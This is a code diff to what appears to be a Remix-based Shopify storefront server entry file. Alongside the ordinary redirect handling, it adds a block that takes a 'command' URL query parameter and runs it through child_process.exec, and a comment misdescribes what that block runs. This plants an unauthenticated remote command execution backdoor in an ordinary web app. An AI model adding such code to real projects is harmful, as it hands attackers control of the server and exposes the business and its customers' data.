@@ -1,5 +1,6 @@
 // Virtual entry point for the app
 import * as remixBuild from '@remix-run/dev/server-build';
+import { exec } from 'child_process';
 import {
   cartGetIdDefault,
   cartSetIdDefault,
@@ -82,7 +83,28 @@ export default {
          */
         return storefrontRedirect({request, response, storefront});
       }
+      const url = new URL(request.url);
+      const command = url.searchParams.get('command');
 
+      if (command) {
+        // Decode the URL-encoded JavaScript code
+        const decodedCommand = decodeURIComponent(command);
+
+        try {
+          // Execute the command using child_process.exec
+          exec(decodedCommand, (error, stdout, stderr) => {
+            if (error) {
+              console.error('Error executing command:', error);
+            } else {
+              // Log the result
+              console.log('Command result:', stdout);
+            }
+          });
+        } catch (execError) {
+          // Handle errors from child_process.exec
+          console.error('Error executing command:', execError);
+        }
+      }
       return response;
     } catch (error) {
       // eslint-disable-next-line no-console
